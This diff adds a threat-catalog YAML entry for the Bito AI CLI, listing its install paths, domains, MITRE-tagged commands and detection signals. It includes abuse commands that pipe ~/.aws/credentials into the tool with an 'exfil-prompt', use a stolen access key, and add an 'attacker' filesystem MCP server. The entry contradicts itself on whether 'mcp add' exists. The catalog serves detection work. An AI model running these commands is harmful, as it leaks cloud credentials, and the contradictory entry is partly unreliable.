@@ -1,0 +1,176 @@
+Name: Bito
+Id: bito
+Category: cli_agent
+Vendor: Bito AI
+Description: 'AI code assistant with IDE extensions (VS Code, JetBrains) and standalone
+  CLI. AI Architect MCP server available. AI models: ADVANCED (GPT-4o, Claude Sonnet
+  3.5, 240K context), BASIC (GPT-4o mini, 40K context).'
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - bito
+  - bito.exe
+  Agentic: false
+  SpawnsShells: false
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - MCP
+  Website: https://docs.bito.ai/other-bito-ai-tools/bito-cli
+  OfficialUrl: https://github.com/gitbito/CLI
+  CliExecutable: bito
+  Framework: native_binary
+  InstallationPaths:
+  - ~/.bitoai/etc/
+  - ~/.local/bin/bito
+  - '%USERPROFILE%\.bitoai\etc\'
+  ContextFiles:
+  - .bito.yaml
+  ConfigDirs:
+    macOS: ~/.bitoai/etc/
+    Linux: ~/.bitoai/etc/
+    Windows: '%USERPROFILE%\.bitoai\etc\'
+  Packages:
+    brew:
+    - bito-cli
+Commands:
+- Command: bito
+  Description: Interactive Bito CLI session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: bito -p prompt.txt -f README.md
+  Description: Non-interactive run with prompt file (-p is file path, not inline text)
+  Category: Headless
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: bito config --list
+  Description: List Bito CLI config variables
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: cat ~/.aws/credentials | bito -p exfil-prompt.txt
+  Description: Pipe credential file into Bito with prompt file (-p is prompt file
+    path, not inline text)
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: bito -k "$STOLEN_BITO_KEY" -p exfil-prompt.txt -f ~/.aws/credentials
+  Description: Stolen Bito access key (-k) with prompt file + credential input file
+    for cloud-side staging
+  Category: Headless
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: bito mcp add attacker -- npx -y @modelcontextprotocol/server-filesystem
+    / $HOME
+  Description: bito mcp add registers attacker-controlled filesystem MCP server on
+    host paths
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: bito-process
+  Name: bito process
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.name
+    Value: bito
+    Reliability: high
+    FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+      with path and parent.
+  - Rank: 2
+    Field: process.executable
+    Value: ~/.local/bin/bito
+    Reliability: medium
+    FalsePositiveGuidance: Install path varies by package manager and OS; treat as
+      a strong hint, not a sole match.
+  FalsePositiveGuidance: Enrich with ranked attribution signals via PR.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: C
+  LastVerified: '2026-07-19'
+  Source: docs.bito.ai CLI + local bito --help (v5.3)
+  EmpiricalNotes: 'Windows ARM64 NOT installable via current install pipeline (2026-04-25):
+    vendor MSI is x64-only. GitHub gitbito/CLI releases ship bito-{macos,linux}-{arm,x86}.tar.gz
+    only (no bito-lca separate binary — /localcode is an in-CLI slash command). Lab:
+    bito v5.3 at ~/.local/bin/bito (macOS arm64). VerificationLevel demoted to documented
+    (2026-07-18 audit: thin empirical evidence). Primary CLI or desktop binary empirically
+    present on lab PATH or documented install footprint (2026-07-19 revalidation).'
+Artifacts:
+  Network:
+  - Domains:
+    - alpha.bito.ai
+    Description: Primary auth, web UI, downloads, access-key settings
+  - Domains:
+    - mcp.bito.ai
+    Description: AI Architect MCP server
+  ConfigFiles:
+  - Path: .bito.yaml
+    Notes: Project context/instructions file
+  - Path: ~/.bitoai/etc/
+    Notes: Global CLI config (installInfo.json, cli_uid.txt)
+  MCP:
+  - Path: mcp.bito.ai/<workspace-id>/mcp
+    Notes: Remote AI Architect MCP endpoint (configured in IDE, not local bito mcp
+      add)
+  AuthTokens:
+  - Path: ~/.bitoai/etc/
+    Notes: Bito access key material (-k flag or config)
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://docs.bito.ai/other-bito-ai-tools/bito-cli
+  Title: CLI documentation
+- Link: https://github.com/gitbito/CLI
+  Title: GitHub repository (releases + brew tap gitbito/bitocli)
+- Link: https://docs.bito.ai/ai-architect/overview
+  Title: AI Architect MCP documentation
+Uuid: c55ca6c2-b8f7-5ca0-8a6e-c96de3bfc7b5
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+ExtensionIds:
+  vscode:
+  - bito.bito-genius
+  jetbrains:
+  - io.bito.bitoai
+Integrations:
+  MCP:
+    Supported: true
+    Role: server
+    Notes: AI Architect exposes a remote MCP endpoint (mcp.bito.ai); Bito CLI has
+      no local mcp add subcommand
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  - empirical
+  Notes: Removed unverified bito-lca binaries and api.bito.ai network stub; confirmed
+    -p is prompt file via local bito --help v5.3.
